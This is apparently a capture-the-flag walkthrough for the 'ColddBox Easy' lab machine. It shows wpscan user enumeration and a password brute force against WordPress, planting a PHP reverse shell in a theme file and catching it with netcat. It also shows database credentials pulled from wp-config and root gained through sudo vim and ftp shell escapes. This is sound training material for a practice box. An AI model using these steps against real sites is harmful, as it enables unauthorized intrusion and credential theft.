# Colddboxeasy

#### Nmap 

80 - http

wordpress

	wpscan --url 10.10.39.162 -e u

Three users found

hugo

c0ldd

philip

	wpscan --url 10.10.39.162 --passwords /usr/share/wordlists/rockyou.txt --usernames c0ldd
	
Username: c0ldd, Password: 9876543210

http://10.10.39.162/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen

edit the page put your php reverse payload & save it

run it http://10.10.39.162/wp-content/themes/twentyfifteen/404.php

check ur NC!

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/colddboxeasy]
└─$ nc -lnvp 1234                             
Listening on 0.0.0.0 1234
Connection received on 10.10.39.162 56042
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:26:31 up 41 min,  0 users,  load average: 0.00, 0.06, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

In wp-config file got c0ldd user passwd 

	/** The name of the database for WordPress */
	define('DB_NAME', 'colddbox');

	/** MySQL database username */
	define('DB_USER', 'c0ldd');

	/** MySQL database password */
	define('DB_PASSWORD', 'cybersecurity');

	/** MySQL hostname */
	define('DB_HOST', 'localhost');

c0ldd:cybersecuity

## Privesc

Multiple ways to escalate privesc

```bash
c0ldd@ColddBox-Easy:~$ sudo -l
sudo -l
[sudo] password for c0ldd: cybersecurity

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

to root

	vim -c ':!/bin/sh'

	sudo ftp
	!/bin/sh

